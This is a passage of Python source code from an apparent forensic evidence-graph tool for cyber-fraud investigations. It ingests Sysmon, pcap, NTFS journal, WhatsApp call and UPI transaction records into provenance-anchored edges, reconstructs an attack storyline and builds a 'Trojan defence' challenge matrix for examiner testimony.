                self._ts(d.get("timestamp_local"), local=True), m={"direction": d.get("direction")})
        elif cat == "VIRTUAL_CAMERA_INJECTOR":
            add(("REGISTRY_KEY", d.get("registry_key") or d.get("friendly_name") or "virtual-camera"), device,
                REL_VIRTUAL_CAMERA, 0, m={"friendly_name": d.get("friendly_name")})
        elif cat == "DIGITAL_ARREST_DEEPFAKE":
            sid = (a or {}).get("session_id") or "unknown-session"
            target = (lead.get("statutory_actions") or {}).get("target_ip")
            caller = ("IDENTITY", f"caller@{target}" if target else "caller:unknown")
            add(caller, ("CALL_SESSION", sid), REL_IMPERSONATED_CALL, session_ts.get(sid, 0),
                m={"verdict": d.get("verdict"), "timestamp_source": "WEBRTC_SESSION_JOIN" if sid in session_ts else None})
            self._endpoint_link(caller, target, session_ts.get(sid, 0), a, out)
        elif cat == "WEBRTC_PEER_ENDPOINT":
            c = d.get("candidate") or {}
            sid = c.get("call_id") or (a or {}).get("session_id") or "unknown-session"
            ts = self._ts(c.get("timestamp_utc"))
            sock = ("SOCKET", f"{c.get('ip')}:{c.get('port')}")
            add(sock, ("CALL_SESSION", sid), REL_PEER_ENDPOINT, ts)
            self._endpoint_link(sock, c.get("ip"), ts, a, out)
            if st.startswith("ANDROID"):
                observed_on(("CALL_SESSION", sid), ts)
        elif cat == "MIRROR_HAWALA_TOKEN":
            ctx = d.get("context", "")
            m = re.match(r"\[(\d{2})/(\d{2})/(\d{2}) (\d{2}):(\d{2})\]\s*([^:]+):", ctx)
            ts, who = 0, "chat-participant"
            if m:
                dd, mm, yy, hh, mi, who = m.groups()
                ts = self._ts(f"20{yy}-{mm}-{dd} {hh}:{mi}:00", local=True)
            add(("IDENTITY", f"chat:{who.strip()}"), ("CASH_TOKEN", d.get("normalized") or d.get("serial") or "?"),
                REL_CASH_HANDOVER, ts)
        elif cat == "RAPID_UPI_SMURFING":
            rows = d.get("row_anchors") or []
            txns = ([d["inflow"]] if d.get("inflow") else []) + list(d.get("pooled_inflows") or []) + list(d.get("outflows") or [])
            by_id = {r.get("txn_id"): r for r in rows}
            for t in txns:
                anc = by_id.get(t.get("txn_id")) or (a if t.get("txn_id") == (a or {}).get("txn_id") else None)
                if anc is None:
                    continue
                add(("UPI_ACCOUNT", t["payer_vpa"]), ("UPI_ACCOUNT", t["payee_vpa"]), REL_UPI_TRANSFER,
                    self._ts(t.get("timestamp_utc")), anchor=anc,
                    m={"txn_id": t.get("txn_id"), "rrn": t.get("rrn"), "amount_inr": t.get("amount_inr")})
            if not out:
                raise ProvenanceError("MISSING_ANCHOR")
        elif cat == "CROSS_CHAIN_BRIDGE":
            u, c = d.get("upi") or {}, d.get("chain") or {}
            add(("UPI_ACCOUNT", u.get("payer_vpa", "?")), ("UPI_ACCOUNT", u.get("payee_vpa", "?")), REL_UPI_TRANSFER,
                self._ts(u.get("timestamp_utc")), m={"txn_id": u.get("txn_id"), "rrn": u.get("rrn")})
            add(("UPI_ACCOUNT", u.get("payee_vpa", "?")), ("CRYPTO_WALLET", f"{c.get('chain', '?')}:{c.get('to_address', '?')}"),
                REL_CROSS_RAIL_BRIDGE, self._ts(c.get("timestamp_utc")), fl=FLAG_CROSS_RAIL,
                sec={"chain_anchor": d["chain_anchor"]} if d.get("chain_anchor") else None,
                m={"tx_hash": c.get("tx_hash"), "amount_usdt": c.get("amount_usdt"), "affinity": d.get("affinity")})
        elif cat == "INVALID_NPCI_RRN":
            t = d.get("transaction") or {}
            add(("UPI_ACCOUNT", t.get("payer_vpa", "?")), ("UPI_ACCOUNT", t.get("payee_vpa", "?")), REL_UPI_TRANSFER,
                self._ts(t.get("timestamp_utc")), m={"rrn": t.get("rrn"), "rrn_invalid": True})
        elif cat == "ANDROID_TROJAN_CAPABILITY":
            add(device, ("APP_PACKAGE", d.get("package", "?")), REL_INSTALLED,
                self._ts(d.get("first_install"), local=True),
                m={"capabilities": d.get("dangerous_capabilities"), "sideloaded": d.get("sideloaded")})
        elif cat == "OVERLAY_HIJACK":
            ts = self._ts(d.get("overlay_event_time"), local=True)
            add(("APP_PACKAGE", d.get("overlay_package", "?")), ("APP_PACKAGE", d.get("banking_package", "?")),
                REL_OVERLAY_HIJACK, ts,
                sec={"banking_event_anchor": d["banking_event_anchor"]} if d.get("banking_event_anchor") else None,
                m={"delta_ms": d.get("delta_ms")})
            observed_on(("APP_PACKAGE", d.get("banking_package", "?")), ts)
        elif cat == "POLYGLOT_APK":
            add(("FILE", f"apk:{(a or {}).get('artifact_id', '?')}"), ("INDICATOR", d.get("finding", cat)),
                REL_EMBEDS_PAYLOAD, 0)
        else:
            add(("FILE", f"artifact:{(a or {}).get('artifact_id', '?')}"), ("INDICATOR", cat), REL_FLAGGED_AS, 0)
        return out

    # ----- raw telemetry ---------------------------------------------------- #

    def _binding(self, src, dst, rel, ts, anchor) -> Optional[int]:
        key = (src[1], dst[1], rel)
        if key in self._bindings_seen:
            return None
        self._bindings_seen.add(key)
        return self.add_edge(src, dst, rel, ts, anchor, 0.0)

    def _hold(self, table: "OrderedDict", key: Any, value: Dict[str, Any], flush: Callable[[Any, Dict[str, Any]], None]
              ) -> None:
        """Bounded wait for corroborating evidence; the oldest waiting record is flushed, never dropped."""
        table[key] = value
        table.move_to_end(key)
        while len(table) > self.PENDING_CAP:
            k, v = table.popitem(last=False)
            flush(k, v)

    def ingest_whatsapp_desktop_log(self, path: str, display: Optional[str] = None) -> int:
        """
        WhatsApp Desktop voip log lines `ts voip call-id=.. from=+91.. name="..." to=+91.. local_user=..`.
        A caller whose display name claims an enforcement agency (CBI, police, customs, ...) is
        scored 0.95 and recorded as IMPERSONATED_CALL; local_user binds the callee number to the
        Windows account the log belongs to.
        """
        n = 0
        for off, line in iter_lines_with_offsets(path):
            text = line.decode("utf-8", "replace")
            if " voip " not in text:
                continue
            kv = dict(re.findall(r'(\w[\w-]*)=("[^"]*"|\S+)', text))
            kv = {k: v.strip('"') for k, v in kv.items()}
            ts = self._ts(text.split(" ", 1)[0])
            anchor = self.make_anchor(path, off, len(line), "WHATSAPP_DESKTOP_VOIP_LOG", display)
            if kv.get("from") and kv.get("to"):
                if _IMPERSONATION_RX.search(kv.get("name", "")):
                    self.add_edge(("IDENTITY", f"mobile:{kv['from']}"), ("IDENTITY", f"mobile:{kv['to']}"),
                                  REL_IMPERSONATED_CALL, ts, anchor, 0.95,
                                  meta={"call_id": kv.get("call-id"), "display_name": kv.get("name")})
                    n += 1
                if kv.get("local_user"):
                    if self._binding(("IDENTITY", f"mobile:{kv['to']}"), ("IDENTITY", f"win:{kv['local_user']}"),
                                     REL_LOGGED_IN_AS, ts, anchor) is not None:
                        n += 1
        return n

    def _proc(self, image: Any, pid: Any) -> str:
        b = _basename(image) or "unknown"
        return f"{b}#{pid}" if pid not in (None, "") else b

    def _flush_net(self, key: Tuple[str, int, str, int], o: Dict[str, Any]) -> None:
        """A Sysmon network-connect that no packet record confirmed: kept, on its own Sysmon anchor."""
        self.add_edge(("PROCESS", o["proc"]), ("SOCKET", f"{key[2]}:{key[3]}"), REL_CONNECTED_TO, o["ts"],
                      o["anchor"], self._net_score(key[2], o["image_path"]),
                      meta={"attribution": "SYSMON_EVENT_3_ONLY"})

    def _flush_file(self, path: str, o: Dict[str, Any]) -> None:
        """A file write that no $MFT record confirmed. Sysmon EID 11 is evidence; a command-line target is only intent."""
        if o["basis"] == "SYSMON_FILE_CREATE":
            self.add_edge(("PROCESS", o["writer"]), ("FILE", path), REL_WROTE_FILE, o["ts"], o["anchor"], 0.5,
                          meta={"timestamp_source": "SYSMON_UTCTIME", "recorded_timestamp_ns": o["ts"],
                                "payload_source_hosts": o.get("payload_source_hosts") or None})
        else:
            self.unconfirmed_intents += 1

    @staticmethod
    def _payload_hosts(cmd: str, path: str) -> Tuple[List[str], str]:
        """Hosts the file at `path` was downloaded from: the URL whose file name matches, else every URL host."""
        urls = _FULL_URL_RX.findall(cmd)
        base = _basename(path)
        named = sorted({h.lower() for h, _p, u in urls if u and _basename(u.replace("/", "\\")) == base})
        if named:
            return named, "URL_FILE_NAME_MATCH"
        return sorted({h.lower() for h, _p, _u in urls}), "SAME_COMMAND_LINE"

    def ingest_sysmon_jsonl(self, path: str, display: Optional[str] = None) -> int:
        """
        Sysmon exported as JSON lines (EventID 1 process create, 3 network connect, 7 image load,
        8 CreateRemoteThread, 11 FileCreate). Process-create edges are scored with Sector B's LOLBin
        engine when present. An image load is kept only when the module is unsigned or sits in a
        user-writable folder (LOADED_MODULE taints the loader like an injection). Network connects
        and file creates wait (bounded, oldest flushed first) for the packet capture / $MFT record
        that physically shows them; finalize_ingest() adds any left unmatched.
        """
        n = 0
        for off, line in iter_lines_with_offsets(path):
            try:
                ev = json.loads(line)
            except ValueError:
                self._reject("UNPARSEABLE_RECORD", {"source_file": display or os.path.basename(path), "byte_offset": off})
                continue
            eid = ev.get("EventID")
            ts = self._ts(ev.get("UtcTime"))
            anchor = self.make_anchor(path, off, len(line), "SYSMON_EVENT_LOG_JSONL", display)
            if eid == 1:
                child = self._proc(ev.get("Image"), ev.get("ProcessId"))
                parent = self._proc(ev.get("ParentImage"), ev.get("ParentProcessId"))
                cmd = ev.get("CommandLine") or ""
                score, mitre = 0.0, None
                if self._log_engine is not None and cmd:
                    r = self._log_engine.analyze_command(cmd, ev.get("Image"), ev.get("ParentImage"))
                    score, mitre = float(r.get("threat_score") or 0.0), r.get("primary_mitre")
                self.add_edge(("PROCESS", parent), ("PROCESS", child), REL_SPAWNED, ts, anchor, score,
                              meta={"command_line": cmd[:512], "mitre": mitre} if score >= 0.5 else None)
                n += 1
                if score >= 0.5:
                    for host, _port in _URL_RX.findall(cmd):
                        self._iocs.add(host)
                    for p in _WIN_PATH_RX.findall(cmd):
                        if _basename(p) == _basename(ev.get("Image")) or p.lower() in self._pending_files:
                            continue
                        hosts, how = self._payload_hosts(cmd, p)
                        self._hold(self._pending_files, p.lower(),
                                   {"writer": child, "ts": ts, "anchor": anchor, "basis": "COMMAND_LINE_TARGET",
                                    "payload_source_hosts": hosts, "payload_host_match": how}, self._flush_file)
                if _basename(ev.get("ParentImage")) in USER_SHELLS and ev.get("User"):
                    if self._binding(("IDENTITY", f"win:{ev['User']}"), ("PROCESS", child), REL_EXECUTED, ts,
                                     anchor) is not None:
                        n += 1
            elif eid == 3:
                key = (str(ev.get("SourceIp")), int(ev.get("SourcePort") or 0), str(ev.get("DestinationIp")),
                       int(ev.get("DestinationPort") or 0))
                self._hold(self._pending_net, key, {"proc": self._proc(ev.get("Image"), ev.get("ProcessId")),
                                                    "image_path": ev.get("Image") or "", "ts": ts, "anchor": anchor},
                           self._flush_net)
            elif eid == 7 and ev.get("ImageLoaded"):
                module = str(ev["ImageLoaded"])
                unsigned = str(ev.get("Signed", "")).lower() in ("false", "0")
                writable = bool(_USER_WRITABLE_RX.search(module))
                if unsigned or writable:
                    self.add_edge(("PROCESS", self._proc(ev.get("Image"), ev.get("ProcessId"))), ("FILE", module),
                                  REL_LOADED_MODULE, ts, anchor, 0.85 if unsigned and writable else 0.6,
                                  meta={"signed": not unsigned, "user_writable_path": writable,
                                        "mitre": "T1574 - Hijack Execution Flow"})
                    n += 1
            elif eid == 8:
                self.add_edge(("PROCESS", self._proc(ev.get("SourceImage"), ev.get("SourceProcessId"))),
                              ("PROCESS", self._proc(ev.get("TargetImage"), ev.get("TargetProcessId"))),
                              REL_INJECTED_INTO, ts, anchor, 0.95, meta={"mitre": "T1055 - Process Injection"})
                n += 1
            elif eid == 11 and ev.get("TargetFilename"):
                p = str(ev["TargetFilename"]).lower()
                prior = self._pending_files.get(p) or {}
                self._hold(self._pending_files, p,
                           {"writer": self._proc(ev.get("Image"), ev.get("ProcessId")), "ts": ts, "anchor": anchor,
                            "basis": "SYSMON_FILE_CREATE",
                            "payload_source_hosts": prior.get("payload_source_hosts") or [],
                            "payload_host_match": prior.get("payload_host_match")}, self._flush_file)
        return n

    def _net_score(self, dst_ip: str, image_path: str) -> float:
        if dst_ip in self._iocs:
            return 0.9
        if image_path and _USER_WRITABLE_RX.search(image_path) and _is_public_ip(dst_ip):
            return 0.85
        return 0.3 if _is_public_ip(dst_ip) else 0.05

    def ingest_pcap(self, path: str, display: Optional[str] = None) -> int:
        """
        One CONNECTED_TO edge per TCP SYN, anchored to the packet record. The owning process comes
        from a matching Sysmon network-connect (same 4-tuple), whose line becomes a secondary anchor.
        Score: destination seen in a suspicious command line 0.9; process image in a user-writable
        folder talking to a public IP 0.85; other public 0.3; private 0.05.
        """
        n = 0
        for pkt in iter_pcap_tcp_syns(path):
            key = (pkt["src_ip"], pkt["src_port"], pkt["dst_ip"], pkt["dst_port"])
            owner = self._pending_net.pop(key, None)
            anchor = self.make_anchor(path, pkt["byte_offset"], pkt["length"], "PCAP_PACKET_RECORD", display)
            dst = ("SOCKET", f"{pkt['dst_ip']}:{pkt['dst_port']}")
            if owner:
                self.add_edge(("PROCESS", owner["proc"]), dst, REL_CONNECTED_TO, pkt["timestamp_ns"], anchor,
                              self._net_score(pkt["dst_ip"], owner["image_path"]),
                              secondary_anchors={"sysmon_network_connect": owner["anchor"]},
                              meta={"attribution": "SYSMON_EVENT_3_4TUPLE"})
            else:
                self.add_edge(("HOST", pkt["src_ip"]), dst, REL_CONNECTED_TO, pkt["timestamp_ns"], anchor,
                              self._net_score(pkt["dst_ip"], ""))
            n += 1
        return n

    def _quarantine(self, name: str, kind: str, rec: Dict[str, Any], bad: int) -> None:
        q = {"source_file": name, "kind": kind, "byte_offset": rec["byte_offset"], "length": rec["length"],
             "bad_sector": bad, "record": rec.get("record_number", rec.get("file_record"))}
        self.timestomp_report["quarantined_records"].append(q)
        self.audit.append(dict(q, action="RECORD_QUARANTINED_BAD_SECTOR"))

    def ingest_ntfs(self, image_path: str, mft_offset: int, mft_length: int, usn_offset: Optional[int] = None,
                    usn_length: Optional[int] = None, usn_stream_offset: int = 0, drive: str = "C:",
                    display: Optional[str] = None) -> Dict[str, Any]:
        """
        Parse an $MFT extent (and optionally the $UsnJrnl:$J extent) of a disk image, run invariants 1-4,
        and add WROTE_FILE edges for files a process was seen writing.

        When the image is the Sector A acquisition, any FILE or USN record touching a known-bad sector
        is quarantined before the invariants run (its bytes are not evidence). Each WROTE_FILE edge is
        anchored to the file's FILE record; its time is the kernel's, in this order: the journal's
        FILE_CREATE record (secondary anchor), else $FN.Created, else $SI.Created as recorded. All
        recorded times are kept in the edge's meta.
        """
        name = display or os.path.basename(image_path)
        self.source_paths[name] = os.path.abspath(image_path)
        screen = self._in_vault_image(name, "ABSOLUTE_IN_FILE")
        with open(image_path, "rb") as f:
            f.seek(mft_offset)
            mft = f.read(mft_length)
            journal = None
            if usn_offset is not None and usn_length:
                f.seek(usn_offset)
                journal = parse_usn_journal(f.read(usn_length), usn_offset, usn_stream_offset)
        records = []
        for r in parse_mft(mft, mft_offset):
            bad = self._overlaps_bad_sector(r["byte_offset"], r["length"]) if screen else None
            if bad is not None:
                self._quarantine(name, "NTFS_MFT_FILE_RECORD", r, bad)
            else:
                records.append(r)
        if journal and screen:
            kept, dropped = [], set()
            for jr in journal["records"]:
                bad = self._overlaps_bad_sector(jr["byte_offset"], jr["length"])
                if bad is not None:
                    self._quarantine(name, "NTFS_USN_RECORD_V2", jr, bad)
                    dropped.add(jr["byte_offset"])
                else:
                    kept.append(jr)
            if dropped:
                creates: Dict[int, Dict[str, Any]] = {}
                for jr in kept:
                    if jr["reason"] & USN_REASON_FILE_CREATE and jr["file_record"] not in creates:
                        creates[jr["file_record"]] = jr
                viol = [v for v in journal["violations"] if v.get("byte_offset") not in dropped]
                journal = dict(journal, records=kept, creates=creates, violations=viol,
                               append_only_ok=not viol and not journal["errors"])
        report = self.timestomp.assess(records, journal)
        paths = resolve_mft_paths(records, drive=drive)
        for fnd in report["findings"]:
            fnd["source_file"] = name
            if fnd.get("record") in paths:
                fnd["path"] = paths[fnd["record"]]
        self.timestomp_report["findings"].extend(report["findings"])
        self.timestomp_report["per_record"].update({paths.get(k, str(k)): v for k, v in report["per_record"].items()})
        self.timestomp_report["journal_append_only_ok"] = report["journal_append_only_ok"]
        creates = journal["creates"] if journal else {}
        added = 0
        for r in records:
            if r.get("error") or r["record_number"] not in paths:
                continue
            path = paths[r["record_number"]]
            intent = self._pending_files.pop(path.lower(), None)
            verdict = report["per_record"].get(r["record_number"], {})
            stomped = verdict.get("verdict") == "TIMESTOMPED"
            if stomped:
                self.set_prize("FILE", path, 0.95)
            if intent is None:
                continue
            anchor = {"source_file": name, "byte_offset": r["byte_offset"], "length": r["length"],
                      "sha256": r["sha256"], "source_type": "NTFS_MFT_FILE_RECORD", "offset_basis": "ABSOLUTE_IN_FILE"}
            secondary = {"writer_evidence": intent["anchor"]}
            recorded = {"si_created_utc": ns_to_iso(filetime_to_ns(r["si"]["B"])) if r.get("si") else None,
                        "fn_created_utc": ns_to_iso(filetime_to_ns(r["fn"]["B"])) if r.get("fn") else None}
            jc = creates.get(r["record_number"])
            if jc:
                ts, source = jc["timestamp_ns"], "KERNEL_USN_JOURNAL_FILE_CREATE"
                recorded["journal_file_create_utc"] = ns_to_iso(ts)
                secondary["usn_file_create"] = {"source_file": name, "byte_offset": jc["byte_offset"],
                                                "length": jc["length"], "sha256": jc["sha256"],
                                                "source_type": "NTFS_USN_RECORD_V2", "offset_basis": "ABSOLUTE_IN_FILE"}
            elif r.get("fn") and r["fn"]["B"]:
                ts, source = filetime_to_ns(r["fn"]["B"]), "NTFS_FN_CREATED"
            else:
                ts, source = (filetime_to_ns(r["si"]["B"]) if r.get("si") else 0), "NTFS_SI_CREATED_AS_RECORDED"
            meta = {"mft_record": r["record_number"], "timestamp_source": source, "recorded_timestamps": recorded,
                    "recorded_timestamp_ns": ts, "timestomp_verdict": verdict.get("verdict"),
                    "invariants_failed": verdict.get("invariants_failed"), "writer_attribution": intent["basis"]}
            if intent.get("payload_source_hosts"):
                meta["payload_source_hosts"] = intent["payload_source_hosts"]
                meta["payload_host_match"] = intent.get("payload_host_match")
            self.add_edge(("PROCESS", intent["writer"]), ("FILE", path), REL_WROTE_FILE, ts, anchor,
                          0.95 if stomped else 0.5, FLAG_TIMESTOMP_INVERTED if stomped else 0,
                          meta=meta, secondary_anchors=secondary)
            added += 1
        return {"records": len(records), "edges_added": added, "findings": len(report["findings"]),
                "quarantined": len(self.timestomp_report["quarantined_records"]),
                "journal_append_only_ok": report["journal_append_only_ok"]}

    def ingest_bank_statement_csv(self, path: str, display: Optional[str] = None) -> int:
        """
        Columns: txn_id, timestamp_utc, holder_mobile, payer_vpa, payee_vpa, amount_inr[, channel].
        holder_mobile binds the statement's registered mobile to the payer VPA (OWNS); each row is
        a UPI_TRANSFER scored 0.8 at or above Rs 1,00,000 and 0.2 below.
        """
        n, header = 0, None
        for off, line in iter_lines_with_offsets(path):
            cells = [c.strip() for c in line.decode("utf-8", "replace").split(",")]
            if header is None:
                header = cells
                continue
            row = dict(zip(header, cells))
            try:
                amount = float(row.get("amount_inr", "nan"))
            except ValueError:
                amount = float("nan")
            if not math.isfinite(amount) or not row.get("payer_vpa") or not row.get("payee_vpa"):
                self._reject("UNPARSEABLE_RECORD", {"source_file": display or os.path.basename(path), "byte_offset": off})
                continue
            ts = self._ts(row.get("timestamp_utc"))
            anchor = self.make_anchor(path, off, len(line), "BANK_STATEMENT_CSV_ROW", display)
            if row.get("holder_mobile"):
                if self._binding(("IDENTITY", f"mobile:{row['holder_mobile']}"), ("UPI_ACCOUNT", row["payer_vpa"]),
                                 REL_OWNS, ts, anchor) is not None:
                    n += 1
            self.add_edge(("UPI_ACCOUNT", row["payer_vpa"]), ("UPI_ACCOUNT", row["payee_vpa"]), REL_UPI_TRANSFER,
                          ts, anchor, 0.8 if amount >= 100000 else 0.2,
                          meta={"txn_id": row.get("txn_id"), "amount_inr": amount, "channel": row.get("channel")})
            n += 1
        return n

    def ingest_npci_switch_log(self, path: str, display: Optional[str] = None, fanout_min: int = 3,
                               window_s: int = 300) -> int:
        """
        NPCI switch lines `ts RRN=.. PAYER=.. PAYEE=.. AMT=.. RESP=..`. A payer that pays fanout_min or
        more distinct payees within window_s is a dispersal hub; those legs score 0.9, others 0.2.
        """
        rows = []
        for off, line in iter_lines_with_offsets(path):
            text = line.decode("utf-8", "replace")
            kv = dict(re.findall(r"(\w+)=(\S+)", text))
            if "PAYER" in kv and "PAYEE" in kv:
                rows.append((off, len(line), self._ts(text.split(" ", 1)[0]), kv))
        by_payer: Dict[str, List[Tuple[int, str]]] = defaultdict(list)
        for _, _, ts, kv in rows:
            by_payer[kv["PAYER"]].append((ts, kv["PAYEE"]))
        hubs = set()
        for payer, legs in by_payer.items():
            legs.sort()
            for i in range(len(legs)):
                window = {p for t, p in legs if legs[i][0] <= t <= legs[i][0] + window_s * NS}
                if len(window) >= fanout_min:
                    hubs.add(payer)
                    break
        for off, ln, ts, kv in rows:
            anchor = self.make_anchor(path, off, ln, "NPCI_SWITCH_LOG", display)
            self.add_edge(("UPI_ACCOUNT", kv["PAYER"]), ("UPI_ACCOUNT", kv["PAYEE"]), REL_UPI_TRANSFER, ts, anchor,
                          0.9 if kv["PAYER"] in hubs else 0.2,
                          meta={"rrn": kv.get("RRN"), "amount_inr": kv.get("AMT"), "fan_out_hub": kv["PAYER"] in hubs})
        return len(rows)

    def finalize_ingest(self) -> int:
        """Flush every record still waiting for corroboration (network connects, file creates)."""
        before = self.arena.count
        while self._pending_net:
            self._flush_net(*self._pending_net.popitem(last=False))
        while self._pending_files:
            self._flush_file(*self._pending_files.popitem(last=False))
        return self.arena.count - before

    # ----- storyline -------------------------------------------------------- #

    EDGE_EPSILON_Q16 = 1024   # every hop costs at least ~0.016, so shorter stories win ties in cost
    BINDING_COST_Q16 = Q16 // 4   # a documented attribution link (same IP, record-from-device, case document)

    def _derived_prizes(self) -> Dict[int, int]:
        prizes = dict(self.node_prize)
        for _seq, (s, d, rel, fl, ts, off, loss) in self.arena.iter_edges():
            if fl & FLAG_SUSPICIOUS:
                q = min(loss, LOSS_MAX_Q16)
                for v in (s, d):
                    if q > prizes.get(v, 0):
                        prizes[v] = q
        return prizes

    def solve_storyline(self, max_nodes: int = 25, lam: float = 2.0) -> Dict[str, Any]:
        if self.causality_report is None:
            self.check_causality()
        def candidates():
            for seq, (s, d, rel, fl, ts, off, loss) in self.arena.iter_edges():
                if rel in BINDING_RELATIONS:
                    cost = self.BINDING_COST_Q16 + self.EDGE_EPSILON_Q16
                else:
                    loss = min(loss, LOSS_MAX_Q16)
                    cost = LOSS_MAX_Q16 - ((loss * self.supernode.gate_q16(s, rel, loss)) >> 16) + self.EDGE_EPSILON_Q16
                # (file, offset, length) fixes the bytes and hence the SHA-256; node order is decided
                # inside the solver by node keys, so the tie key stays small
                p = self.ledger.get(seq)
                yield s, d, cost, (off, p["source_file"], p["length"], rel, ts), seq
        edges = candidates()
        solver = PCSTStorylineSolver(max_nodes=max_nodes, lam=lam)
        res = solver.solve(edges, self._derived_prizes(), self.entities.key)
        res["solver"] = solver
        return res

    def _anchor_verified(self, prov: Dict[str, Any]) -> Optional[bool]:
        path = self._resolve_source(prov["source_file"])
        if path is None:
            return None
        # read the bytes again at export time (never the ingest-time cache): a file changed in between fails here
        return self._rehash(path, prov["byte_offset"], prov["length"], fresh=True) == prov["sha256"]

    def _section63(self, prov: Dict[str, Any]) -> Dict[str, Any]:
        out = {"source_file": prov["source_file"], "byte_offset": prov["byte_offset"], "length": prov["length"],
               "sha256": prov["sha256"], "hash_algorithm": "SHA-256", "source_type": prov["source_type"],
               "offset_basis": prov["offset_basis"],
               "anchor_reverified": self._anchor_verified(prov) if self.verify_anchors else None}
        if self.sector_a and os.path.basename(prov["source_file"]) in self.vault_files:
            out["sector_a_evidence_id"] = self.sector_a["evidence_id"]
            out["sector_a_master_case_root"] = self.sector_a["master_case_root_v3"]
        return out

    def _step(self, e: Dict[str, Any], t0: int) -> Dict[str, Any]:
        rel, fl, ts = e["rel"], e["flags"], e["ts"]
        actor, target = self.entities.label(e["src"]), self.entities.label(e["dst"])
        verb = RELATION_VERB.get(rel, RELATION_NAMES[rel].lower())
        stage = RELATION_STAGE.get(rel, 2)
        meta = e["meta"]
        basis = "REPAIRED_LOWER_BOUND" if fl & FLAG_TIME_REPAIRED else ("UNKNOWN" if not ts else "AS_RECORDED")
        step = {"stage": stage, "stage_name": STAGES[stage], "timestamp_utc": ns_to_iso(ts), "timestamp_ns": ts,
                "timestamp_basis": basis, "timestamp_source": meta.get("timestamp_source") or e["provenance"]["source_type"],
                "recorded_timestamp_ns": meta.get("recorded_timestamp_ns", ts), "actor": actor, "actor_kind": self.entities.kinds[e["src"]],
                "action": verb, "target": target, "target_kind": self.entities.kinds[e["dst"]],
                "relation": RELATION_NAMES[rel], "flags": flag_names(fl), "anomaly_score": q16_to_score(e["loss"]),
                "narrative": f"{actor} {verb} {target}" + (" (time is a repaired lower bound)" if fl & FLAG_TIME_REPAIRED else ""),
                "edge_uid": self.edge_uid(e), "provenance": self._section63(e["provenance"])}
        if meta.get("secondary_anchors"):
            step["secondary_anchors"] = {k: self._section63(v) for k, v in sorted(meta["secondary_anchors"].items())}
        for k in ("lead_id", "mitre", "timestamp_repair", "epoch_split", "txn_id", "rrn", "amount_inr", "call_id",
                  "timestomp_verdict", "tx_hash", "recorded_timestamps", "payload_source_hosts", "binding_basis",
                  "document"):
            if meta.get(k) is not None:
                step[k] = meta[k]
        if ts and t0:
            step["delta_t_ns"] = ts - t0      # exact integer; feed encoder.encode_ns() for the bijective features
        return step

    @staticmethod
    def storyline_paradoxes(steps: Sequence[Dict[str, Any]], tolerance_ns: int = NS) -> List[Dict[str, Any]]:
        """Independent re-check on the exported steps: no step by a process predates that process's spawn step."""
        born: Dict[str, int] = {}
        for s in steps:
            if s["relation"] == "SPAWNED" and s.get("timestamp_ns"):
                born[s["target"]] = min(born.get(s["target"], s["timestamp_ns"]), s["timestamp_ns"])
        out = []
        prev = None
        for s in steps:
            t = s.get("timestamp_ns") or 0
            if t and s["actor"] in born and t < born[s["actor"]] - tolerance_ns:
                out.append({"step": s.get("step"), "rule": "ACTOR_ACTS_BEFORE_IT_EXISTS"})
            if t and prev and t < prev:
                out.append({"step": s.get("step"), "rule": "STEPS_NOT_CHRONOLOGICAL"})
            if t:
                prev = t
        return out

    def defense_challenge_matrix(self, steps: Sequence[Dict[str, Any]], bindings: Sequence[Dict[str, Any]]
                                 ) -> Dict[str, Any]:
        """
        The standard 'Trojan defence' challenges, each answered only from the anchored record.
        Statuses: REBUTTED / OPEN / NOT_EVALUATED. This is an aid to the examiner's Section 45
        testimony, not a finding of guilt.
        """
        allrows = list(steps) + list(bindings)
        rows = []
        ver = [p["anchor_reverified"] for p in _all_anchors(allrows)]
        a_ok = bool(self.sector_a and self.sector_a["manifest_digest"] == "VERIFIED")
        rows.append({"id": "D1", "challenge": "Evidence was planted or altered after seizure",
                     "status": "REBUTTED" if (allrows and self.verify_anchors and all(v is True for v in ver)
                                              and a_ok) else "OPEN",
                     "basis": f"{sum(v is True for v in ver)}/{len(ver)} storyline anchors (primary and secondary) "
                              f"re-hashed from the evidence; Sector A manifest digest "
                              f"{'verified' if a_ok else 'not verified'}"
                              + ("" if self.verify_anchors else "; ANCHOR VERIFICATION WAS DISABLED")})
        cr = self.causality_report or {"unresolved": 0, "repaired": 0, "paradoxes_detected": 0}
        sp = self.storyline_paradoxes(steps)
        repaired = [s["edge_uid"] for s in steps if s["timestamp_basis"] == "REPAIRED_LOWER_BOUND"]
        rows.append({"id": "D2", "challenge": "Timestamps were manipulated to fabricate the sequence",
                     "status": "REBUTTED" if not sp and cr["unresolved"] == 0 else "OPEN",
                     "basis": f"{cr['paradoxes_detected']} causality inversions found and {cr['repaired']} repaired "
                              f"(disclosed per step); {len(self.timestomp_report['findings'])} $MFT/$J findings; "
                              f"{len(sp)} inversions left in the storyline",
                     "evidence": repaired})
        fin = [s for s in steps if s["stage"] == 4 and s.get("timestamp_ns")]
        human = [s for s in steps if s["relation"] in ("IMPERSONATED_CALL", "REMOTE_SESSION") and s.get("timestamp_ns")]
        first_fin = min((s["timestamp_ns"] for s in fin), default=None)
        lead_in = [s for s in human if first_fin is None or s["timestamp_ns"] <= first_fin]
        rows.append({"id": "D3", "challenge": "Autonomous malware, not a human operator, carried out the fraud",
                     "status": "REBUTTED" if lead_in and fin else ("NOT_EVALUATED" if not fin else "OPEN"),
                     "basis": f"{len(lead_in)} human-operated contact step(s) precede the first of {len(fin)} "
                              f"financial step(s)", "evidence": [s["edge_uid"] for s in lead_in]})
        rows.append({"id": "D4", "challenge": "The events are coincidental, not one connected sequence",
                     "status": "REBUTTED" if len(steps) >= 2 and not sp else "OPEN",
                     "basis": f"{len(steps)} steps and {len(bindings)} attribution links form one connected tree"})
        rows.append({"id": "D5", "challenge": "Content was recovered from damaged media",
                     "status": "REBUTTED" if self.sector_a is not None else "NOT_EVALUATED",
                     "basis": (f"Sector A recorded {len(self.bad_sectors)} unreadable sector(s); "
                               f"{self.rejected_count.get('ANCHOR_IN_BAD_SECTOR', 0)} anchor(s) inside them were refused"
                               if self.sector_a is not None else "no Sector A manifest bound")})
        cl = self.exculpatory_checklist
        if cl and cl.get("checks"):
            intr = [c["check"] for c in cl["checks"] if c.get("result") == "SUPPORTS_INTRUSION_HYPOTHESIS"]
            rows.append({"id": "D6", "challenge": "Exculpatory evidence (remote access, third-party control) was ignored",
                         "status": "OPEN" if intr else "REBUTTED",
                         "basis": f"Sector B Section 45 checklist: {len(cl['checks'])} checks, "
                                  f"{len(intr)} support an intrusion hypothesis", "evidence": intr})
        else:
            rows.append({"id": "D6", "challenge": "Exculpatory evidence (remote access, third-party control) was ignored",
